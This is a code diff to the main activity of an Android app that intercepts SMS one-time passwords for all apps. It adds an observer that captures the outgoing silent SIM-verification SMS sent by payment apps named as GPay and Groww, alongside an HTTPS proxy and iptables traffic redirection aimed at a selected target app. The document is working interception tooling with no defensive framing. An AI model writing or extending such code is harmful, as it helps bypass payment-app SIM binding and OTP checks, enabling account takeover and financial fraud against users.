@@ -20,6 +20,7 @@ public class MainActivity extends Activity {
 
     private ProxyManager    proxyManager;
     private IptablesManager iptablesManager;
+    private SentSmsObserver sentSmsObserver;
     private SharedPreferences prefs;
 
     private String selectedPackage = "";
@@ -51,9 +52,14 @@ public class MainActivity extends Activity {
         selectedUid     = prefs.getInt("target_uid", -1);
         etTargetApp.setText(selectedPackage);
 
-        // hook SMS listener so received messages show in the log
+        // hook incoming SMS listener
         SmsBroadcastReceiver.setListener((sender, body) ->
-            runOnUiThread(() -> log("📱 SMS from " + sender + ": " + body))
+            runOnUiThread(() -> log("📱 Incoming SMS from " + sender + ": " + body))
+        );
+
+        // hook outgoing (silent SIM-verify) SMS listener
+        SentSmsObserver.setListener((toNumber, body) ->
+            runOnUiThread(() -> log("📤 Outgoing SMS to " + toNumber + ": " + body))
         );
 
         btnPickApp.setOnClickListener(v ->
@@ -146,8 +152,13 @@ public class MainActivity extends Activity {
         new Thread(() -> {
             StringBuilder startLog = new StringBuilder();
             try {
+                // Start outgoing SMS observer (catches silent SIM-verify SMS from GPay/Groww etc.)
+                sentSmsObserver = new SentSmsObserver(MainActivity.this);
+                sentSmsObserver.register();
+                startLog.append("Outgoing SMS observer active (GPay/Groww SIM verify)\n");
+
                 // SMS interception is always active once permissions are granted
-                startLog.append("SMS OTP interception active for all apps\n");
+                startLog.append("Incoming SMS interception active for all apps\n");
 
                 // Start HTTPS proxy if a target app was chosen
                 if (hasTarget) {
@@ -184,6 +195,7 @@ public class MainActivity extends Activity {
 
         new Thread(() -> {
             try {
+                if (sentSmsObserver != null) sentSmsObserver.unregister();
                 if (iptablesManager != null) iptablesManager.stop();
                 proxyManager.stop();
                 running = false;
